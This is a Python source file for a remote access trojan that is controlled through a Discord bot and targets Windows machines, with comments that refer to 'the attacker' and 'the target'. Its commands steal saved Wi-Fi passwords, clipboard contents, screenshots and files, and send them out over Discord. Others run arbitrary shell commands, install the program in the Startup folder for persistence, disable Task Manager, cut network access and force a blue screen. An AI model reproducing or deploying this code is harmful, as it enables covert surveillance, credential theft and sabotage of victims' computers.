import requests, time, os, ctypes, threading, discord, sys, psutil, pyautogui, io, shutil, subprocess, pyperclip, socket, winreg # type: ignore <<< This is so it ignores the warnings
from discord.ext import commands # type: ignore <<< This is so it ignores the warnings
from discord import app_commands # type: ignore <<< This is so it ignores the warnings
import scapy.all as scapy # type: ignore <<< This is so it ignores the warnings
import tkinter as tk # make sure to have PyNaCl installed!
from tkinter import messagebox

BlockedProccesses = set()
currentdir = os.getcwd()
Token = "" # Put your discord token of the bot here
BlockedSites = [] # a list of block websites
intents = discord.Intents.all() # depending on your intents you might want to change this
bot = commands.Bot(command_prefix='!', intents=intents) # kinda just a config file for the bot

def KillProcces():
    while True: # causes a loop
        for proc in psutil.process_iter(["pid", "name"]): # Scan the processes
            if proc.info["name"] and proc.info["name"].lower() in BlockedProccesses: # Checking if the process names are the same as the list
                try: # using try method becuase we can get the errors that way
                    psutil.Process(proc.info["pid"]).terminate() # Kills the process
                except psutil.NoSuchProcess: # this is if it doesnt find the blacklisted process
                    pass # It doesnt do anything if it doesnt find it
        time.sleep(0.5) # How long it takes for the next scan 

@bot.event # on ready is a special event for the discord module
async def on_ready(): # This is when the bot starts the first things it does
    await bot.tree.sync() # Syncs all the commands and updates them

@bot.tree.command(name="blockwebsite", description="Block a website")
async def blockwebsite(interaction: discord.Interaction, website: str):
    try:
        with open(r"C:\Windows\System32\drivers\etc\hosts", "a") as file: # Added method called to the host file
            file.write(f"0.0.0.0 {website}\n") # this adds the actual line to the host file
        
        await interaction.response.send_message(f"{website} has been blocked") # Message telling you its been blocked
    except Exception as e:
        await interaction.response.send_message(f"{e}") # It sending the error


@bot.tree.command(name="listwebsites", description="List all websites blocked")
async def listwebsites(interaction: discord.Interaction): 
    with open(r"C:\Windows\System32\drivers\etc\hosts", "r") as file:  # Open hosts file in read mode
        lines = file.readlines()  # Read all lines from the file
    for line in lines:  # reads each line
        if line.startswith("0.0.0.0"):  # cehcks if the line is blocking a site
            BlockedSites.append(line.split(" ")[1].strip())  # get website
    # sends a message of the blocked sites
    if BlockedSites:
        await interaction.response.send_message("Blocked Websites:\n" + "\n".join(BlockedSites))
    else:
        await interaction.response.send_message("No websites are blocked rn")


@bot.tree.command(name="unblock", description="Unblock a website by removing it from the hosts file.")
async def unblock(interaction: discord.Interaction, website: str):
        with open(r"C:\Windows\System32\drivers\etc\hosts", "r") as file: # opens the file as read
            lines = file.readlines() # Reads each line
        with open(r"C:\Windows\System32\drivers\etc\hosts", "w") as file: # Writes the host file
            for line in lines: # Gets each line
                if line.strip() != f"0.0.0.0 {website}": # If it fines the website it will remove it
                    file.write(line) # It clearing out the hosts file
        await interaction.response.send_message(f"{website} has been unblocked") # Message telling you its been unblocked

@bot.tree.command(name="screenshot", description="Take a screenshot of your screen")
async def screenshot(interaction: discord.Interaction):
    try:
        screenshot = pyautogui.screenshot() # This takes a screenshot
        with io.BytesIO() as ImageBinary: # This takes the screenshot Binary
            screenshot.save(ImageBinary, format='PNG') # This makes a png file with the binary code
            ImageBinary.seek(0) # This goes tot hte start of the in memory file
            await interaction.response.send_message("Here is your screenshot:", file=discord.File(ImageBinary, filename="screenshot.png")) # Sends the screenshot
            # os.system("del screenshot.png") was gonna use this but if the image is stored in the memory you dont need to use it
    
    except Exception as e: # This function gets called when there is a error
        await interaction.response.send_message(f"{e}") # this sends a message of the error

@bot.tree.command(name="systeminfo", description="Get system information (CPU, RAM, Disk, Network)")
async def systeminfo(interaction: discord.Interaction):
    CpuUsage = psutil.cpu_percent(interval=1) # Gets CPU info
    ram = psutil.virtual_memory() # Gets ram info
    disk = psutil.disk_usage('/') # Gets disk info 
    net = psutil.net_io_counters() # Gets Net info

    embed = discord.Embed(title="📊 System Information", color=discord.Color.blue()) # makes a embedded message that is blue
    embed.add_field(name="🖥 CPU Usage", value=f"{CpuUsage}%", inline=False) # Just shows the cpu usage
    embed.add_field(name="💾 RAM Usage", value=f"{ram.percent}% ({ram.used // (1024**3)}GB / {ram.total // (1024**3)}GB)", inline=False) # i hope a random stackoverflow dude did the math right :sob:
    embed.add_field(name="🖴 Disk Usage", value=f"{disk.percent}% ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)", inline=False) # i hope a random stackoverflow dude did the math right :sob:
    embed.add_field(name="📡 Network", value=f"Sent: {net.bytes_sent // (1024**2)} MB | Received: {net.bytes_recv // (1024**2)} MB", inline=False) # i hope a random stackoverflow dude did the math right :sob:

    await interaction.response.send_message(embed=embed) # sends the message that is embedded

@bot.tree.command(name="uptime", description="Show system uptime")
async def uptime(interaction: discord.Interaction):
    BootTime = psutil.boot_time() # Gets the boot time
    UpTimeSecs = time.time() - BootTime # Gets the up time in seconds
    SystemUpTimeString = time.strftime("%H:%M:%S", time.gmtime(UpTimeSecs)) # Converts it so its readable
    await interaction.response.send_message(f"⏳ System Uptime: `{SystemUpTimeString}`") # sends the message

# Basically shows how long they been afk for
@bot.tree.command(name="idle", description="Get system idle time")
async def idle(interaction: discord.Interaction):
    IdleTime = time.time() - psutil.users()[0].started # Gets the System Idle Time
    IdleString = time.strftime("%H:%M:%S", time.gmtime(IdleTime)) # Converts it so its readable
    await interaction.response.send_message(f"🛑 System Idle Time: `{IdleString}`") # Sends the message of the idle time

@bot.tree.command(name="listprocesses", description="List all running processes")
async def listprocesses(interaction: discord.Interaction):
    processes = [p.info["name"] for p in psutil.process_iter(["name"]) if p.info["name"]] # Gets all the processes
    ListProcesses = "\n".join(processes[:30])  # I limited this to 300 processes feel free to change it
    embed = discord.Embed(title="📃 Running Processes", description=f"```{ListProcesses}```", color=discord.Color.green()) # Embeds the message
    await interaction.response.send_message(embed=embed) # Sends the embededed message of all the processes

@bot.tree.command(name="blockprocess", description="Block a process (kills it right as it starts)")
async def blockprocess(interaction: discord.Interaction, processname: str):
    processname = processname.lower().strip()
    if not processname: # If it cant find the process name
        await interaction.response.send_message("⚠️ Please provide a valid process name.") # cant find the process name
        return

    if processname in BlockedProccesses: # Detecting if the process is blocked already
        await interaction.response.send_message(f"🔒 `{processname}` is already blocked.")  # Sends a message telling you its blocked
    else:
        BlockedProccesses.add(processname)  # Add process to blacklist
        await interaction.response.send_message(f"🚫 Blocking `{processname}`. It will be killed if started.") # sends a message telling you its gonna be blocked

@bot.tree.command(name="unblockprocess", description="Unblock a process (remove it from the block list)")
async def unblockprocess(interaction: discord.Interaction, processname: str):
    processname = processname.lower().strip()  # fixes the input
    
    if processname in BlockedProccesses: # If the process is in blocked procceseses
        BlockedProccesses.remove(processname)  # Remove from block list
        await interaction.response.send_message(f"✅ `{processname}` has been unblocked.") # then send a message saying its been unblocked
    else: # if its not in the block list
        await interaction.response.send_message(f"⚠️ `{processname}` is not in the block list.") # Then it will tell you its not

@bot.tree.command(name="listblocked", description="List all blocked processes")
async def listblocked(interaction: discord.Interaction):
    if BlockedProccesses: # If proccess
        BlockedLists = "\n".join(BlockedProccesses) # Gets all the of proccess
        embed = discord.Embed(title="🚫 Blocked Processes", description=f"```\n{BlockedLists}\n```", color=discord.Color.red()) # Makes the message (content: BlockedList and Color Blue)
        await interaction.response.send_message(embed=embed) # Sends the message
    else: # if there is nothing in BlockedProcesses
        await interaction.response.send_message("✅ No processes are currently blocked.") # Then it will tell you there is nun

@bot.tree.command(name="internet_fucker", description="Disable internet access till they restart")
async def internet_fucker(interaction: discord.Interaction):
    os.system("ipconfig /release") # Runs a cmd command that fucks there internet till they do ipconfig /renew or restarts there pc
    await interaction.response.send_message("Internet access fucked!") # tells you the internet got messed up

@bot.tree.command(name="startup", description="Add file to startup.")
async def startup(interaction: discord.Interaction):
    appdata = os.getenv('APPDATA') # Gets local appdata
    scriptdir = sys.argv[0] # Gets the exe dir
    startup = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup') # From the local app data it goes to Microsoft > Windows > Start Menu > Programs > Startup
    shutil.copy(scriptdir, startup) # Copys the exe to the startup folder. You can do shutil.move to actually move the file
    await interaction.response.send_message("File added to startup.") # Tells the attacker that it was moved

@bot.tree.command(name="unstartup", description="Remove file from startup.")
async def unstartup(interaction: discord.Interaction):
    try:
        appdata = os.getenv('APPDATA') # Gets local appdata
        scriptdir = sys.argv[0] # Gets the exe dir
        startup = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup') # From the local app data it goes to Microsoft > Windows > Start Menu > Programs > Startup
        paths = os.path.join(startup, scriptdir)  # Full path to the file in the Startup folder

        if os.path.exists(paths):  # Check if the file is a thing first
            os.remove(paths)  # Remove the file from Startup
            await interaction.response.send_message(f"File {scriptdir} removed from startup")
        else:
            await interaction.response.send_message(f"File {scriptdir} not found in startup")

    except Exception as e:
        await interaction.response.send_message(f"Error: {e}")  # Send error if anything goes wrong

@bot.tree.command(name="shutdown", description="Shuts down the system")
async def shutdown(interaction: discord.Interaction):
    await interaction.response.send_message("System is shutting down...") # Message says what action its performing
    subprocess.run(["shutdown", "/s", "/f", "/t", "0"])  # Windows shutdown command

@bot.tree.command(name="logout", description="Logs out the current user")
async def logout(interaction: discord.Interaction):
    await interaction.response.send_message("Logging out...") # Message says what action its performing
    subprocess.run(["shutdown", "/l"])  # Windows logout command

@bot.tree.command(name="sleep", description="Puts the system to sleep") 
async def sleep(interaction: discord.Interaction):
    await interaction.response.send_message("System is going to sleep...") # Message says what action its performing
    subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0", "1", "0"])  # Windows sleep command

@bot.tree.command(name="getwifipasswords", description="Get saved Wi-Fi passwords on the system.")
async def getwifi(interaction: discord.Interaction):
        profiles = subprocess.check_output('netsh wlan show profiles', shell=True, text=True) # Gets all wifi names and passwords if saved
        ProfileNames = [line.split(":")[1][1:-1] for line in profiles.split('\n') if "All User Profile" in line] # gets the names of the wifi from the string
        if not ProfileNames: # Checks if there is any strings found
            await interaction.response.send_message("No Wi-Fi profiles found on this system.") # Sends this if not found
            return
        Details = "" # Where the info is gonna go
        for ProfileInfoo in ProfileNames: # Checks if the names are in the list
            try:
                info = subprocess.check_output(f'netsh wlan show profile name="{ProfileInfoo}" key=clear', shell=True, text=True) # Gets the details for each profile
                PassString = [line for line in info.split('\n') if "Key Content" in line] # Gets the passwords from the profiles
                if PassString: # If it finds the profile
                    password = PassString[0].split(":")[1][1:].strip() # Extract the pass
                    Details += f"Profile: {ProfileInfoo}\nPassword: {password}\n\n" # set message string
                else: # If there isnt any passwords
                    Details += f"Profile: {ProfileInfoo}\nPassword: Not set\n\n" # Set message string
            except subprocess.CalledProcessError:
                Details += f"Profile: {ProfileInfoo}\nPassword: Error retrieving\n\n" # Error getting passwords
        if Details: # If there is wifi names or passwords it sets the if as true
            await interaction.response.send_message(f"```{Details}```") # Sends the info

@bot.tree.command(name="clipboard", description="Get the current clipboard contents.")
async def clipboard(interaction: discord.Interaction):
        ClipBoardString = pyperclip.paste()  # Get the current clipboard strings
        if ClipBoardString: # if the clipboard has a string
            await interaction.response.send_message(f"Clipboard content:\n```{ClipBoardString}```") # sends the clipboard
        else: # If the clipboard doesnt have any info
            await interaction.response.send_message("Clipboard is empty.") # Sends feedback saying its empty

@bot.tree.command(name="startwebsite", description="Launch a website in the default browser.")
async def startwebsite(interaction: discord.Interaction, url: str):
    if url.startswith("http://") or url.startswith("https://"): # checks if the url has https in it
        os.system(f'start {url}') # If it does then it starts the url with cmd
        await interaction.response.send_message(f"Launching website: {url}") # Feedback saying it started
    else: # if it doesnt have https in it
        await interaction.response.send_message("it aint got the https in it cuh") # Feedback saying it doesnt have https

@bot.tree.command(name="checkadmin", description="Check if the bot is running as an admin.")
async def checkadmin(interaction: discord.Interaction):
    if ctypes.windll.shell32.IsUserAnAdmin() != 0: # Checks if its admin
        await interaction.response.send_message("✅ The bot is running as Administrator!") # Sends feedback
    else: # if not admin
        await interaction.response.send_message("❌ The bot is not running as Administrator.") # Sends feeedback

@bot.tree.command(name="exec", description="Execute system commands.") # do we really need commands for this
async def exec(interaction: discord.Interaction, command: str): # If you have read all these notes you
    try:                                                                # You should know what all this does
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.stdout:
            await interaction.response.send_message(f"Output:\n```{result.stdout}```")
        if result.stderr:
            await interaction.response.send_message(f"Error:\n```{result.stderr}```")
        
    except Exception as e:
        await interaction.response.send_message(f"An error occurred while executing the command: {e}")

# ===========================FUCK THE NOTES IM NOT LONGER DOING THEM!=================================#

@bot.tree.command(name="ipinfo", description="Get local and public IP information.")
async def ipinfo(interaction: discord.Interaction):
    try:
        ComputerIP = socket.gethostbyname(socket.gethostname())
        PublicIP= requests.get('https://api.ipify.org').text

        embed = discord.Embed(title="🌐 IP Information", color=discord.Color.blue())
        embed.add_field(name="💻 Local IP", value=f"{ComputerIP}", inline=False)
        embed.add_field(name="🌍 Public IP", value=f"{PublicIP}", inline=False)
        await interaction.response.send_message(embed=embed)

    except Exception as e:
        await interaction.response.send_message(f"An error occurred while fetching IP information: {e}")

@bot.tree.command(name="messagebox", description="Display a simple message box on the local machine.")
async def messagebox1(interaction: discord.Interaction, msg: str):
    try:
        root = tk.Tk()
        root.withdraw() 
        messagebox.showinfo("Info", msg)
        await interaction.response.send_message(f"Bro got the message lol")
    except Exception as e:
        await interaction.response.send_message(f"{e}")

@bot.tree.command(name="disabletaskmanager", description="Disable Task Manager")
async def disabletm(interaction: discord.Interaction):
        RegKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(RegKey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(RegKey)
        await interaction.response.send_message("Task Manager has been disabled")

@bot.tree.command(name="enablertaskmanager", description="Enable Task Manager")
async def enabletm(interaction: discord.Interaction):
        RegKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(RegKey, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(RegKey)
        await interaction.response.send_message("Task Manager has been enabled")

@bot.tree.command(name="bsod", description="Blue screens the user you prob want to put the program on startup")
async def bluescreen(interaction: discord.Interaction):
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
    await interaction.response.send_message("bluescreening UNLESS its not being ran as admin")
    os._exit(1)

@bot.tree.command(name="critprocess", description="Mark the process as critical")
async def critprocess(interaction: discord.Interaction):
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    await interaction.response.send_message("This process is now marked as critical")

@bot.tree.command(name="uncritprocess", description="Mark the process as uncritical")
async def uncritprocess(interaction: discord.Interaction):
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    await interaction.response.send_message("This process is no longer critical")

@bot.tree.command(name="download", description="Download a file from the target")
async def download(interaction: discord.Interaction, filename: str):
    try:
        downloaddir = os.getcwd()
        path = os.path.join(downloaddir, filename)
        if os.path.exists(path):
            await interaction.response.send_message(f"Here is your file: `{filename}`", file=discord.File(path))
        else:
            await interaction.response.send_message(f"File `{filename}` not found.")
    except Exception as e:
        await interaction.response.send_message(f"An error occurred: {e}")

@bot.tree.command(name="cd", description="Change the current directory.")
async def cd(interaction: discord.Interaction, path: str):
    global currentdir
    try:
        newdir = os.path.join(currentdir, path)
        if os.path.isdir(newdir):
            currentdir = newdir
            await interaction.response.send_message(f"Directory changed to `{currentdir}`")
        else:
            await interaction.response.send_message(f"Directory `{path}` not found.")
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}")

@bot.tree.command(name="ls", description="List files in the current directory.")
async def ls(interaction: discord.Interaction):
    try:
        files = os.listdir(currentdir)
        if files:
            await interaction.response.send_message(f"Files in `{currentdir}`: \n" + "\n".join(files))
        else:
            await interaction.response.send_message(f"No files found in `{currentdir}`.")
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}")

thread = threading.Thread(target=KillProcces, daemon=True) # This is to start threading on a function
thread.start() # This is to start threading for the process blocker
bot.run(Token) # This is the line that starts the whole bot (its basically god)